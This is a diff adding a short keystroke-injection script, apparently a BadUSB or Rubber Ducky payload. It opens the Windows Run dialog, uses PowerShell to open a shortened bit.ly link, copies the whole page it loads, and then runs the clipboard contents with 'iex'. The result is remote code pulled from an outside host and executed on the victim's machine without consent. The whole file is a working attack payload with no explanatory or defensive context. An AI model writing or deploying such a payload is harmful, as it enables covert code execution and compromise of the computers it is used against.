@@ -1,0 +1,14 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell start "https://bit.ly/2WoCzq9"
+DELAY 200
+ENTER
+DELAY 35000
+CTRL a
+DELAY 100
+CTRL c
+GUI r
+DELAY 200
+STRING powershell iex (get-clipboard | out-string)
+ENTER
